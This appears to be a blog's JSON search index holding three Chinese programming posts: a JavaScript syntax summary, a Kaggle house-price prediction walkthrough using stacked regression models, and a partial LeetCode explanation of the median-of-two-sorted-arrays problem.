{"pages":[],"posts":[{"title":"JavaScript摘要","text":"JavaScript摘要1.基本数据类型JavaScript的基本构建块包括：对象(object)、原语(primitive)和字面量(literal)。 literal 表示特定类型的一个值，例如：String, Number, or Boolean。 123&quot;this is a string&quot;1.45true Primitive 是一个特定数据类型的实例，包括五种：String, Number, Boolean, null, undefined。 JavaScript 的世界中，一切皆对象（object）。 2.基本语法函数声明: 12345function distance(x1, y1, x2, y2) { var dx = x2 - x1; var dy = y2 - y1; return Math.sqrt(dx*dx + dy*dy);} 条件语句： 1234567if (x &lt;= 1){ return 1; }else{ return x*fact(x-1);}if (this.length == 0) return this; 循环语句： 1234567891011for(i=0;i&lt;10;i++){ tst+=i; }for (var i in obj) { result += obj_name + \".\" + i + \" = \" + obj[i] + \"&lt;br&gt;\"; }while((matchArray = pattern.exec(searchString)) != null) {str+=\"at \" + matchArray.index + \" we found \" + matchArray[0] + \"\\n\"; } 3.数组创建数组： 123var arr = new Array(element0, element1, ..., elementN);var arr = Array(element0, element1, ..., elementN);var arr = [element0, element1, ..., elementN]; 填充数组： 12345678var emp = [];emp[0] = \"Casey Jones\";emp[1] = \"Phil Lesh\";emp[2] = \"August West\";var arr = [];arr[3.4] = \"Oranges\";console.log(arr.length); // 0console.log(arr.hasOwnProperty(3.4)); // true 如果你在以上代码中给数组操作符的是一个非整形数值，那么将作为一个代表数组的对象的属性(property)创建，而非作为数组的元素。 引用数组元素： 123var arr = [\"one\", \"two\", \"three\"];arr[2]; // threearr[\"length\"]; // 3 数组操作符（方括号 [ ]）也可以用来访问数组的属性(在 JavaScript 中，数组也是对象)。 遍历数组： 123456789var colors = ['red', 'green', 'blue'];for (var i = 0; i &lt; colors.length; i++) { console.log(colors[i]);}var colors = ['red', 'green', 'blue'];colors.forEach(function(color) { console.log(color);}); 数组对象的方法： concat() 连接两个数组并返回一个新的数组。 join(deliminator = ',') 将数组的所有元素连接成一个字符串。 push() 在数组末尾添加一个或多个元素，并返回数组操作后的长度。 pop() 从数组移出最后一个元素，并返回该元素。 shift() 从数组移出第一个元素，并返回该元素。 4.集合类Map 123456789101112131415161718var sayings = new Map();sayings.set('dog', 'woof');sayings.set('cat', 'meow');sayings.set('elephant', 'toot');sayings.size; // 3sayings.get('fox'); // undefinedsayings.has('bird'); // falsesayings.delete('dog');sayings.has('dog'); // falsefor (var [key, value] of sayings) { console.log(key + ' goes ' + value);}// \"cat goes meow\"// \"elephant goes toot\"sayings.clear();sayings.size; // 0 Map和Object的比较： 一般地，objects会被用于将字符串类型映射到数值。Object允许设置键值对、根据键获取值、删除键、检测某个键是否存在。而Map具有更多的优势。 Object的键均为Strings类型，在Map里键可以是任意类型。 必须手动计算Object的尺寸，但是可以很容易地获取使用Map的尺寸。 Map的遍历遵循元素的插入顺序。 Object有原型，所以映射中有一些缺省的键。（可以理解为map = Object.create(null)）。 Set 1234567891011121314151617var mySet = new Set();mySet.add(1);mySet.add(\"some text\");mySet.add(\"foo\");mySet.has(1); // truemySet.delete(\"foo\");mySet.size; // 2for (let item of mySet) console.log(item);// 1// \"some text\"# Array 和 Set的转换Array.from(mySet);[...mySet2];mySet2 = new Set([1,2,3,4]); Array和Set的对比： 一般情况下，在JavaScript中使用数组来存储一组元素，而新的集合对象有这些优势： 数组中用于判断元素是否存在的indexOf 函数效率低下。 Set对象允许根据值删除元素，而数组中必须使用基于下标的 splice 方法。 数组的indexOf方法无法找到NaN值。 Set对象存储不重复的值，所以不需要手动处理包含重复值的情况。 5.字符串String 字面量 12'foo'\"bar\" String对象 String对象是对 String 类型的封装。 123var s = new String(\"foo\"); // Creates a String objectconsole.log(s); // Displays: { '0': 'f', '1': 'o', '2': 'o'}typeof s; // Returns 'object' 模板字符串 12345var a = 5;var b = 10;console.log(`Fifteen is ${a + b} and\\nnot ${2 * a + b}.`);// \"Fifteen is 15 and// not 20.\" 方法 描述 charAt, charCodeAt, codePointAt 返回字符串指定位置的字符或者字符编码。 indexOf, lastIndexOf 分别返回字符串中指定子串的位置或最后位置。 startsWith, endsWith, includes 返回字符串是否以指定字符串开始、结束或包含指定字符串。 concat 连接两个字符串并返回新的字符串。 fromCharCode, fromCodePoint 从指定的Unicode值序列构造一个字符串。这是一个String类方法，不是实例方法。 split 通过将字符串分离成一个个子串来把一个String对象分裂到一个字符串数组中。 slice 从一个字符串提取片段并作为新字符串返回。 substring, substr 分别通过指定起始和结束位置，起始位置和长度来返回字符串的指定子集。 6.面向对象基于类VS基于原型的语言 基于类的面向对象语言，比如 Java 和 C++，是构建在两个不同实体的概念之上的：即类和实例。 类可以定义属性，这些属性可使特定的对象集合特征化（可以将 Java 中的方法和变量以及 C++ 中的成员都视作属性）。类是抽象的，而不是其所描述的对象集合中的任何特定的个体。例如 Employee 类可以用来表示所有雇员的集合。 另一方面，一个实例是一个类的实例化；也就是其中一名成员。例如， Victoria 可以是 Employee 类的一个实例，表示一个特定的雇员个体。实例具有和其父类完全一致的属性。 基于原型的语言（如 JavaScript）并不存在这种区别：它只有对象。基于原型的语言具有所谓原型对象的概念。原型对象可以作为一个模板，新对象可以从中获得原始的属性。任何对象都可以指定其自身的属性，既可以是创建时也可以在运行时创建。而且，任何对象都可以作为另一个对象的原型，从而允许后者共享前者的属性。 差异总结 基于类的（Java） 基于原型的（JavaScript） 类和实例是不同的事物。 所有对象均为实例。 通过类定义来定义类；通过构造器方法来实例化类。 通过构造器函数来定义和创建一组对象。 通过 new 操作符创建单个对象。 相同。 通过类定义来定义现存类的子类，从而构建对象的层级结构。 指定一个对象作为原型并且与构造函数一起构建对象的层级结构 遵循类链继承属性。 遵循原型链继承属性。 类定义指定类的所有实例的所有属性。无法在运行时动态添加属性。 构造器函数或原型指定初始的属性集。允许动态地向单个的对象或者整个对象集中添加或移除属性。 首先了解该语言的基本数据类型，基本语法和主要语言构造，主要数学运算符和print函数的使用，达到能够写谭浩强程序设计书课后数学习题的程度； 其次掌握数组和其他集合类的使用，有基础的话可以理解一下泛型，如果理解不了也问题不大，后面可以补； 简单字符串处理。所谓简单，就是Regex和Parser以下的内容，什么查找替换，截断去字串之类的。不过这个阶段有一个难点，就是字符编码问题。如果理解不了，可以先跳过，否则的话最好在这时候把这个问题搞定，免留后患； 基本面向对象或者函数式编程的特征，无非是什么继承、多态、Lambda函数之类的，如果有经验的话很快就明白了； 异常、错误处理、断言、日志和调试支持，对单元测试的支持。你不一定要用TDD，但是在这个时候应该掌握在这个语言里做TDD的基本技能； 程序代码和可执行代码的组织机制，运行时模块加载、符号查找机制，这是初学时的一个难点，因为大部分书都不太注意介绍这个极为重要的内容； 基本输入输出和文件处理，输入输出流类的组织，这通常是比较繁琐的一部分，可以提纲挈领学一下，搞清楚概念，用到的时候查就是了。到这个阶段可以写大部分控制台应用了； 该语言如何进行callback方法调用，如何支持事件驱动编程模型。在现代编程环境下，这个问题是涉及开发思想的一个核心问题，几乎每种语言在这里都会用足功夫，.NET的delegate，Java的anonymous inner class，Java 7的closure，C++OX的 tr1::function/bind，五花八门。如果能彻底理解这个问题，不但程序就不至于写得太走样，而且对该语言的设计思路也能有比较好的认识； 如果有必要，可在这时研究regex和XML处理问题，如无必要可跳过； 序列化和反序列化，掌握一下缺省的机制就可以了； 如果必要，可了解一下线程、并发和异步调用机制，主要是为了读懂别人的代码，如果自己要写这类代码，必须专门花时间严肃认真系统地学习，严禁半桶水上阵； 动态编程，反射和元数据编程，数据和程序之间的相互转化机制，运行时编译和执行的机制，有抱负的开发者在这块可以多下些功夫，能够使你对语言的认识高出一个层面； 如果有必要，可研究一下该语言对于泛型的支持，不必花太多时间，只要能使用现成的泛型集合和泛型函数就可以了，可在以后闲暇时抽时间系统学习。需要注意的是，泛型技术跟多线程技术一样，用不好就成为万恶之源，必须系统学习，谨慎使用，否则不如不学不用； 如果还有时间，最好咨询一下有经验的人，看看这个语言较常用的特色features是什么，如果之前没学过，应当补一下。比如Ruby的block interator, Java的dynamic proxy，C# 3的LINQ和extension method。没时间的话，我认为也可以边做边学，没有大问题。 有必要的话，在工作的闲暇时间，可以着重考察两个问题，第一，这个语言有哪些惯用法和模式，第二，这个语言的编译/解释执行机制。","link":"/2019/01/26/JavaScript摘要/"},{"title":"Kaggle之房价预测","text":"Kaggle入门赛之房价预测 前言：最近实验室有一个数据挖掘的任务需要完成，是一个和国家电网相关的回归任务。因此我在 Kaggle 上找一些回归任务的比赛来练练手，房价预测这个比赛的难度比较适合我这种新手，因此选择了这个题目。本篇博客的大部分内容来自该比赛的一个高分 kernel, 感兴趣的同学可以直接跳转查看原博。 1.比赛介绍这是 Kaggle 上的一个为数据科学初学者准备的比赛，需要参赛者掌握一定的 R 或 Python 以及机器学习的基础知识。它给出了一个训练集和一个测试集，最终需要对测试集中的结果进行预测并提交。训练集中包含了79个特征以预测房价（SalePrice），包括：房屋的大小、地段、用途、基础设施等等。具体的描述可查看该比赛的比赛页面,比赛中所用到数据也均可通过比赛页面下载。 2.准备工作数据挖掘类的比赛最为重要的工作就是：特征工程。本篇博客将会用到的特征工程方法还是非常朴素的，具体如下： 通过已有的数据拟合曲线来填充缺失值。 变换某些看起来更像分类变量的数值型变量。 标签编码一些带有排序信息的分类变量（例如，标签顺序按照出现次数大小排序）。 对于一些倾斜特征采用 Box Cox 变换（替代对数变换）：这会得到一个更好的结果。 得到分类特征的假值。 之后我们将会选择一些基本模型（例如基于 sklearn 的 XGBoost），在 stacking/ensembling 之前在数据集上进行交叉验证。它的关键在于让（线性）模型对异常值鲁棒。这将同时提高积分板和交叉验证的分数。 接下来真正开始工作吧！首先导入相关的包和比赛所需的数据。 123456789101112131415161718192021222324#import some necessary librairiesimport numpy as np # linear algebraimport pandas as pd # data processing, CSV file I/O (e.g. pd.read_csv)%matplotlib inlineimport matplotlib.pyplot as plt # Matlab-style plottingimport seaborn as snscolor = sns.color_palette()sns.set_style('darkgrid')import warningsdef ignore_warn(*args, **kwargs): passwarnings.warn = ignore_warn #ignore annoying warning (from sklearn and seaborn)from scipy import statsfrom scipy.stats import norm, skew #for some statisticspd.set_option('display.float_format', lambda x: '{:.3f}'.format(x)) #Limiting floats output to 3 decimal pointsfrom subprocess import check_outputprint(check_output([\"ls\", \"../input\"]).decode(\"utf8\")) #check the files available in the directory sample_submission.csv test.csv train.csv 123456#Now let's import and put the train and test datasets in pandas dataframetrain = pd.read_csv('../input/train.csv')test = pd.read_csv('../input/test.csv')##display the first five rows of the train dataset.train.head(5) 12##display the first five rows of the test dataset.test.head(5) 123456789101112131415#check the numbers of samples and featuresprint(\"The train data size before dropping Id feature is : {} \".format(train.shape))print(\"The test data size before dropping Id feature is : {} \".format(test.shape))#Save the 'Id' columntrain_ID = train['Id']test_ID = test['Id']#Now drop the 'Id' colum since it's unnecessary for the prediction process.train.drop(\"Id\", axis = 1, inplace = True)test.drop(\"Id\", axis = 1, inplace = True)#check again the data size after dropping the 'Id' variableprint(\"\\nThe train data size after dropping Id feature is : {} \".format(train.shape)) print(\"The test data size after dropping Id feature is : {} \".format(test.shape)) 123456&gt;The train data size before dropping Id feature is : (1460, 81) &gt;The test data size before dropping Id feature is : (1459, 80) &gt;&gt;The train data size after dropping Id feature is : (1460, 80) &gt;The test data size after dropping Id feature is : (1459, 79) &gt; 3.数据处理异常值首先对数据集中的重要特征的异常值进行处理。 12345fig, ax = plt.subplots()ax.scatter(x = train['GrLivArea'], y = train['SalePrice'])plt.ylabel('SalePrice', fontsize=13)plt.xlabel('GrLivArea', fontsize=13)plt.show() 可从散点图中看到有两个非常明显的异常值，有着极大的房屋面积房价却很低。这两个值是非常典型的异常值，因此可以安全地删除它们。 123456789#Deleting outlierstrain = train.drop(train[(train['GrLivArea']&gt;4000) &amp; (train['SalePrice']&lt;300000)].index)#Check the graphic againfig, ax = plt.subplots()ax.scatter(train['GrLivArea'], train['SalePrice'])plt.ylabel('SalePrice', fontsize=13)plt.xlabel('GrLivArea', fontsize=13)plt.show() 注意：删除异常值并不总是安全的。我们决定删除这两个值是因为它俩太奇怪了（极大的空间有着极低的价格）。 数据集中仍然可能存在其它的异常值。然而删除所有的异常值可能对模型产生不好的影响，特别是当它们可能出现在测试集的时候。因此在处理异常值得时候最好不要全部删除掉，以提高模型的鲁棒性。 目标变量房价是我们需要预测的目标变量，因此首先对它进行一些分析。 1df_train['SalePrice'].describe() 12345678910&gt;count 1460.000000&gt;mean 180921.195890&gt;std 79442.502883&gt;min 34900.000000&gt;25% 129975.000000&gt;50% 163000.000000&gt;75% 214000.000000&gt;max 755000.000000&gt;Name: SalePrice, dtype: float64&gt; 12345678910111213141516sns.distplot(train['SalePrice'] , fit=norm);# Get the fitted parameters used by the function(mu, sigma) = norm.fit(train['SalePrice'])print( '\\n mu = {:.2f} and sigma = {:.2f}\\n'.format(mu, sigma))#Now plot the distributionplt.legend(['Normal dist. ($\\mu=$ {:.2f} and $\\sigma=$ {:.2f} )'.format(mu, sigma)], loc='best')plt.ylabel('Frequency')plt.title('SalePrice distribution')#Get also the QQ-plotfig = plt.figure()res = stats.probplot(train['SalePrice'], plot=plt)plt.show() 12&gt; mu = 180932.92 and sigma = 79467.79&gt; 目标变量是接近正态分布的。线性模型在正态分布的数据上拟合效果更好，所以我们可以对数据做一些变换使其更接近正态分布。 目标变量的对数变换1234567891011121314151617181920#We use the numpy fuction log1p which applies log(1+x) to all elements of the columntrain[\"SalePrice\"] = np.log1p(train[\"SalePrice\"])#Check the new distribution sns.distplot(train['SalePrice'] , fit=norm);# Get the fitted parameters used by the function(mu, sigma) = norm.fit(train['SalePrice'])print( '\\n mu = {:.2f} and sigma = {:.2f}\\n'.format(mu, sigma))#Now plot the distributionplt.legend(['Normal dist. ($\\mu=$ {:.2f} and $\\sigma=$ {:.2f} )'.format(mu, sigma)], loc='best')plt.ylabel('Frequency')plt.title('SalePrice distribution')#Get also the QQ-plotfig = plt.figure()res = stats.probplot(train['SalePrice'], plot=plt)plt.show() 12&gt; mu = 12.02 and sigma = 0.40&gt; 在经过对数变换后，房价数据接近于正态分布。 4.特征工程首先将训练数据和测试数据合并到一个数据帧。 123456ntrain = train.shape[0]ntest = test.shape[0]y_train = train.SalePrice.valuesall_data = pd.concat((train, test)).reset_index(drop=True)all_data.drop(['SalePrice'], axis=1, inplace=True)print(\"all_data size is : {}\".format(all_data.shape)) 12&gt;all_data size is : (2917, 79)&gt; 缺失数据1234all_data_na = (all_data.isnull().sum() / len(all_data)) * 100all_data_na = all_data_na.drop(all_data_na[all_data_na == 0].index).sort_values(ascending=False)[:30]missing_data = pd.DataFrame({'Missing Ratio' :all_data_na})missing_data.head(20) 123456f, ax = plt.subplots(figsize=(15, 12))plt.xticks(rotation='90')sns.barplot(x=all_data_na.index, y=all_data_na)plt.xlabel('Features', fontsize=15)plt.ylabel('Percent of missing values', fontsize=15)plt.title('Percent missing data by feature', fontsize=15) 12&gt;Text(0.5,1,&apos;Percent missing data by feature&apos;) &gt; 数据关联1234#Correlation map to see how features are correlated with SalePricecorrmat = train.corr()plt.subplots(figsize=(12,9))sns.heatmap(corrmat, vmax=0.9, square=True) 输入缺失值根据不同特征的不同情况对缺失值进行填充。 对于离散值且数据说明里有 NA 选项，则将缺失值补为None。 PoolQC : 数据描述说 NA 表示 “没有泳池”。这是有意义的，因为有大量的缺失数据，这表明大多数的房子都没有游泳池。 1all_data[\"PoolQC\"] = all_data[\"PoolQC\"].fillna(\"None\") MiscFeature : 数据描述说 NA 表示“没有杂项特征”。 1all_data[\"MiscFeature\"] = all_data[\"MiscFeature\"].fillna(\"None\") Alley : 数据描述说 NA 表示“没有小巷联通”。 1all_data[\"Alley\"] = all_data[\"Alley\"].fillna(\"None\") Fence : 数据描述说 NA 表示“没有棚栏”。 1all_data[\"Fence\"] = all_data[\"Fence\"].fillna(\"None\") 对于和其他特征有关联的值，可以先按其它特征分组，然后取中位数 。 LotFrontage : 因为房子附近的街道到房子的距离和到该房子临近的房子的距离是类似的，因此去临近房子的中位数来填充该距离。 123#Group by neighborhood and fill in missing value by the median LotFrontage of all the neighborhoodall_data[\"LotFrontage\"] = all_data.groupby(\"Neighborhood\")[\"LotFrontage\"].transform( lambda x: x.fillna(x.median())) 对于连续值，将缺失的值补为0。 BsmtFinSF1, BsmtFinSF2, BsmtUnfSF, TotalBsmtSF, BsmtFullBath and BsmtHalfBath :缺失的值为0意味着没有基础设施。 12for col in ('BsmtFinSF1', 'BsmtFinSF2', 'BsmtUnfSF','TotalBsmtSF', 'BsmtFullBath', 'BsmtHalfBath'): all_data[col] = all_data[col].fillna(0) 对于离散值且在数据说明里没有 NA 选项，则将缺失值填充为出现最多的值 。 MSZoning(大致区域分类)：‘RL’是最常见的值。所以我们使用‘RL’填充缺失值。 1all_data['MSZoning'] = all_data['MSZoning'].fillna(all_data['MSZoning'].mode()[0]) 对于所有值几乎都一样，参考意义不大的特征，直接删除 。 Utilities:该特征所有的值几乎都为‘AllPub’,除了一个‘NoSeWa’和2个NA。因为唯一的’NoSewa’出现在训练集，这个特征将不会对预测有帮助，因此可以安全地移除它。 1all_data = all_data.drop(['Utilities'], axis=1) 在缺失值处理完后，可以简单地查看是否还有未处理地缺失值： 12345#Check remaining missing values if any all_data_na = (all_data.isnull().sum() / len(all_data)) * 100all_data_na = all_data_na.drop(all_data_na[all_data_na == 0].index).sort_values(ascending=False)missing_data = pd.DataFrame({'Missing Ratio' :all_data_na})missing_data.head() 更多特征工程将某些看起来是连续值的特征转换为离散值1234567891011#MSSubClass=The building classall_data['MSSubClass'] = all_data['MSSubClass'].apply(str)#Changing OverallCond into a categorical variableall_data['OverallCond'] = all_data['OverallCond'].astype(str)#Year and month sold are transformed into categorical features.all_data['YrSold'] = all_data['YrSold'].astype(str)all_data['MoSold'] = all_data['MoSold'].astype(str) 标签编码一些带有排序信息的分类变量（例如，标签顺序按照出现次数大小排序）。1234567891011121314from sklearn.preprocessing import LabelEncodercols = ('FireplaceQu', 'BsmtQual', 'BsmtCond', 'GarageQual', 'GarageCond', 'ExterQual', 'ExterCond','HeatingQC', 'PoolQC', 'KitchenQual', 'BsmtFinType1', 'BsmtFinType2', 'Functional', 'Fence', 'BsmtExposure', 'GarageFinish', 'LandSlope', 'LotShape', 'PavedDrive', 'Street', 'Alley', 'CentralAir', 'MSSubClass', 'OverallCond', 'YrSold', 'MoSold')# process columns, apply LabelEncoder to categorical featuresfor c in cols: lbl = LabelEncoder() lbl.fit(list(all_data[c].values)) all_data[c] = lbl.transform(list(all_data[c].values))# shape print('Shape all_data: {}'.format(all_data.shape)) 增加一个更为重要的特征因为面积相关的特征对房价的影响是非常大的。所以我们增加了一个特征来描述基础设施的总面积，第一层和第二层的面积。 12# Adding total sqfootage feature all_data['TotalSF'] = all_data['TotalBsmtSF'] + all_data['1stFlrSF'] + all_data['2ndFlrSF'] 斜率特征1234567numeric_feats = all_data.dtypes[all_data.dtypes != \"object\"].index# Check the skew of all numerical featuresskewed_feats = all_data[numeric_feats].apply(lambda x: skew(x.dropna())).sort_values(ascending=False)print(\"\\nSkew in numerical features: \\n\")skewness = pd.DataFrame({'Skew' :skewed_feats})skewness.head(10) Box Cox变换高斜率特征1234567891011skewness = skewness[abs(skewness) &gt; 0.75]print(\"There are {} skewed numerical features to Box Cox transform\".format(skewness.shape[0]))from scipy.special import boxcox1pskewed_features = skewness.indexlam = 0.15for feat in skewed_features: #all_data[feat] += 1 all_data[feat] = boxcox1p(all_data[feat], lam) #all_data[skewed_features] = np.log1p(all_data[skewed_features]) 获取分类特征的假值12all_data = pd.get_dummies(all_data)print(all_data.shape) 获取新的训练集和测试集 12train = all_data[:ntrain]test = all_data[ntrain:] 5.模型导入相关库 12345678910from sklearn.linear_model import ElasticNet, Lasso, BayesianRidge, LassoLarsICfrom sklearn.ensemble import RandomForestRegressor, GradientBoostingRegressorfrom sklearn.kernel_ridge import KernelRidgefrom sklearn.pipeline import make_pipelinefrom sklearn.preprocessing import RobustScalerfrom sklearn.base import BaseEstimator, TransformerMixin, RegressorMixin, clonefrom sklearn.model_selection import KFold, cross_val_score, train_test_splitfrom sklearn.metrics import mean_squared_errorimport xgboost as xgbimport lightgbm as lgb 定义交叉策略我们使用 Sklearn 中的 cross_cal_score 函数。然而这个函数没有扰乱属性，我们添加了一行代码，使得在交叉验证前对数据集进行扰乱。 1234567#Validation functionn_folds = 5def rmsle_cv(model): kf = KFold(n_folds, shuffle=True, random_state=42).get_n_splits(train.values) rmse= np.sqrt(-cross_val_score(model, train.values, y_train, scoring=\"neg_mean_squared_error\", cv = kf)) return(rmse) 基础模型 LASSO 回归： 这个模型会对异常值特别敏感。所以我们需要让它变得更加鲁棒。在 pipeline 中使用 sklearn 中的 Robustscaler() 方法。 1lasso = make_pipeline(RobustScaler(), Lasso(alpha =0.0005, random_state=1)) Elastic Net 回归： 1ENet = make_pipeline(RobustScaler(), ElasticNet(alpha=0.0005, l1_ratio=.9, random_state=3)) Kernel Ridge 回归： 1KRR = KernelRidge(alpha=0.6, kernel=&apos;polynomial&apos;, degree=2, coef0=2.5) Gradient Boosting 回归： 使用 huber loss 使其对异常值鲁棒 1234GBoost = GradientBoostingRegressor(n_estimators=3000, learning_rate=0.05, max_depth=4, max_features='sqrt', min_samples_leaf=15, min_samples_split=10, loss='huber', random_state =5) XGBoost: 123456model_xgb = xgb.XGBRegressor(colsample_bytree=0.4603, gamma=0.0468, learning_rate=0.05, max_depth=3, min_child_weight=1.7817, n_estimators=2200, reg_alpha=0.4640, reg_lambda=0.8571, subsample=0.5213, silent=1, random_state =7, nthread = -1) LightGBM: 123456model_lgb = lgb.LGBMRegressor(objective='regression',num_leaves=5, learning_rate=0.05, n_estimators=720, max_bin = 55, bagging_fraction = 0.8, bagging_freq = 5, feature_fraction = 0.2319, feature_fraction_seed=9, bagging_seed=9, min_data_in_leaf =6, min_sum_hessian_in_leaf = 11) 基本模型分数模型初始化好之后就开始测试一下交叉验证的损失分数吧。 12score = rmsle_cv(lasso)print(\"\\nLasso score: {:.4f} ({:.4f})\\n\".format(score.mean(), score.std())) 12&gt;Lasso score: 0.1115 (0.0074)&gt; 12score = rmsle_cv(ENet)print(\"ElasticNet score: {:.4f} ({:.4f})\\n\".format(score.mean(), score.std())) 12&gt;ElasticNet score: 0.1116 (0.0074)&gt; 12score = rmsle_cv(KRR)print(\"Kernel Ridge score: {:.4f} ({:.4f})\\n\".format(score.mean(), score.std())) 12&gt;Kernel Ridge score: 0.1153 (0.0075)&gt; 12score = rmsle_cv(GBoost)print(\"Gradient Boosting score: {:.4f} ({:.4f})\\n\".format(score.mean(), score.std())) 12&gt;Gradient Boosting score: 0.1177 (0.0080)&gt; 12score = rmsle_cv(model_xgb)print(\"Xgboost score: {:.4f} ({:.4f})\\n\".format(score.mean(), score.std())) 12&gt;Xgboost score: 0.1161 (0.0079)&gt; 12score = rmsle_cv(model_lgb)print(\"LGBM score: {:.4f} ({:.4f})\\n\" .format(score.mean(), score.std())) 12&gt;LGBM score: 0.1157 (0.0067)&gt; 堆叠模型（stacking model)最简单的堆叠方法：平均化基础模型我们首先用最简单的方法实验，构建一个新类来拓展 scikit-learn 中 model类，作为我们自己的堆叠模型。 平均化的基础模型类1234567891011121314151617181920class AveragingModels(BaseEstimator, RegressorMixin, TransformerMixin): def __init__(self, models): self.models = models # we define clones of the original models to fit the data in def fit(self, X, y): self.models_ = [clone(x) for x in self.models] # Train cloned base models for model in self.models_: model.fit(X, y) return self #Now we do the predictions for cloned models and average them def predict(self, X): predictions = np.column_stack([ model.predict(X) for model in self.models_ ]) return np.mean(predictions, axis=1) 平均化的基础模型分数1234averaged_models = AveragingModels(models = (ENet, GBoost, KRR, lasso))score = rmsle_cv(averaged_models)print(\" Averaged base models score: {:.4f} ({:.4f})\\n\".format(score.mean(), score.std())) 12&gt; Averaged base models score: 0.1091 (0.0075)&gt; 从结果看来，简单的堆叠模型确实提高了分数。这将激励我们探索更为高效的堆叠模型。 不那么简单的堆叠模型：增加一个元模型在这个方法中，我们将会在简单堆叠模型的基础上增加一个元模型并使用基本模型的预测结果来训练元模型。 元模型的训练过程如下： 划分数据集为两个分离的部分（train 和 holdout） 使用第一部分训练几个基本的模型（train） 在这些训练过的模型上使用第二部分进行测试（holdout） 使用3）中的预测结果作为输入，正确地响应作为输出来训练元模型 前三步是可以迭代完成的。举例来说，我们有一个包含5个基本模型的堆叠模型，我们首先会把训练数据分为5份 。之后我们会做五次迭代。在每一次迭代中，我们在4份数据上训练基本模型然后在剩下的那份数据上预测。 可以确信的是，在五次迭代后，我们可以得到完整的5份由基本模型预测得到的训练数据，这在之后将会作为训练数据来训练我们的原模型。 在预测部分，我们会平均所有基础模型在测试数据上的预测结果，并将它们作为元特征，最终的预测结果将由元模型得出。 #####改进的堆叠模型类 12345678910111213141516171819202122232425262728293031323334class StackingAveragedModels(BaseEstimator, RegressorMixin, TransformerMixin): def __init__(self, base_models, meta_model, n_folds=5): self.base_models = base_models self.meta_model = meta_model self.n_folds = n_folds # We again fit the data on clones of the original models def fit(self, X, y): self.base_models_ = [list() for x in self.base_models] self.meta_model_ = clone(self.meta_model) kfold = KFold(n_splits=self.n_folds, shuffle=True, random_state=156) # Train cloned base models then create out-of-fold predictions # that are needed to train the cloned meta-model out_of_fold_predictions = np.zeros((X.shape[0], len(self.base_models))) for i, model in enumerate(self.base_models): for train_index, holdout_index in kfold.split(X, y): instance = clone(model) self.base_models_[i].append(instance) instance.fit(X[train_index], y[train_index]) y_pred = instance.predict(X[holdout_index]) out_of_fold_predictions[holdout_index, i] = y_pred # Now train the cloned meta-model using the out-of-fold predictions as new feature self.meta_model_.fit(out_of_fold_predictions, y) return self #Do the predictions of all base models on the test data and use the averaged predictions as #meta-features for the final prediction which is done by the meta-model def predict(self, X): meta_features = np.column_stack([ np.column_stack([model.predict(X) for model in base_models]).mean(axis=1) for base_models in self.base_models_ ]) return self.meta_model_.predict(meta_features) 改进的堆叠模型的分数为了使得两种方法有可比性（使用了同样数量的基础模型），我们使用了 Enet、KRR、Gboost作为基础模型，使用 lasso 作为元模型。 12345stacked_averaged_models = StackingAveragedModels(base_models = (ENet, GBoost, KRR), meta_model = lasso)score = rmsle_cv(stacked_averaged_models)print(\"Stacking Averaged models score: {:.4f} ({:.4f})\".format(score.mean(), score.std())) 12&gt;Stacking Averaged models score: 0.1085 (0.0074)&gt; 通过加入元模型确实得到了更好的结果。 融合模型我们增加了 XGBoost、LightGBM 到之前定义的堆叠模型中。 我们首先定义一个评估函数 rmsle 12def rmsle(y, y_pred): return np.sqrt(mean_squared_error(y, y_pred)) 最终的训练和预测StackRegressor: 1234stacked_averaged_models.fit(train.values, y_train)stacked_train_pred = stacked_averaged_models.predict(train.values)stacked_pred = np.expm1(stacked_averaged_models.predict(test.values))print(rmsle(y_train, stacked_train_pred)) 12&gt;0.0781571937916&gt; XGBoost: 1234model_xgb.fit(train, y_train)xgb_train_pred = model_xgb.predict(train)xgb_pred = np.expm1(model_xgb.predict(test))print(rmsle(y_train, xgb_train_pred)) 12&gt;0.0785165142425&gt; LightGBM: 1234model_lgb.fit(train, y_train)lgb_train_pred = model_lgb.predict(train)lgb_pred = np.expm1(model_lgb.predict(test.values))print(rmsle(y_train, lgb_train_pred)) 12&gt;0.0716757468834&gt; 12345'''RMSE on the entire Train data when averaging'''print('RMSLE score on train data:')print(rmsle(y_train,stacked_train_pred*0.70 + xgb_train_pred*0.15 + lgb_train_pred*0.15 )) 123&gt;RMSLE score on train data:&gt;0.0752190464543&gt; 融合预测： 1ensemble = stacked_pred*0.70 + xgb_pred*0.15 + lgb_pred*0.15 提交： 1234sub = pd.DataFrame()sub['Id'] = test_IDsub['SalePrice'] = ensemblesub.to_csv('submission.csv',index=False)","link":"/2018/12/07/Kaggle之房价预测/"},{"title":"LeetCode题解——两个有序数组的中值","text":"4.Median of Two Sorted Arrays描述有两个排序的数组 nums1 和nums2，它们的大小分别是 m 和 n。 找到两个排序数组的中值。程序的时间复杂度为 O(log(m+n))。 你可以认为 nums1和 nums2 不会同时为空。 Example 1: 1234nums1 = [1, 3]nums2 = [2]The median is 2.0 Example 2: 1234nums1 = [1, 2]nums2 = [3, 4]The median is (2 + 3)/2 = 2.5 方法为了解决这个问题，我们需要明白“中值可以用来做什么”。在统计学里，中值被用来： 将一个集合划分成两个等长的子集，其中一个子集的元素总是比另一个大。 如果我们理解了划分中值的意义，我们就可以很好地理解答案了。 首先将 nums1 在随机位置 i 分成两部分： 123 left_nums1 | right_nums1nums1[0], nums1[1], ..., nums1[i-1] | nums1[i], nums1[i+1], ..., nums1[m-1] 因为 nums1 有 m 个元素，所以有 m+1 种划分法(i = 0~m)。 而且我们知道： len(left_nums1) = i, len(right_nums1) = m - i. Note: when i = 0, left_nums1 is empty, and when i = m, right_A is empty. 同样的，将 nums2 在随机位置 j 分成两部分： 12 left_nums2 | right_nums2nums2[0], nums2[1], ..., nums2[j-1] | nums2[j], nums2[j+1], ..., nums2[n-1] 将 left_nums1和 left_nums2 放在一个集合并将 right_nums1和 right_nums1放在另一个集合。让我们命名为 left_part 和 right_part： 123 left_part | right_partnums1[0], nums1[1], ..., nums1[i-1] | nums1[i], nums1[i+1], ..., nums2[n-1]nums2[0], nums2[1], ..., nums2[j-1] | nums2[j], nums2[j+1], ..., nums2[n-1] 我们可以确定： 1.len(left_part) = len(right_part) 2.max(left_part) &lt;= min(right_part) 之后我们划分所有在 {nums1, nums2} 的元素到两个等长的集合，其中一个集合的元素总是比另一个大。 $median = \\frac{max(left_part)+min(right_part)}{2}$ 为了确保这两个条件，我们需要保证： 1.i+j = m - i + n - j (or: m - i + n - j + 1) if n &gt;= m, we just need to set: i = 0~m, j = (m+n+1)/2 -i 2.nums2[j-1] &lt;= nums1[i] and nums1[i-1] &lt;= nums2[j] 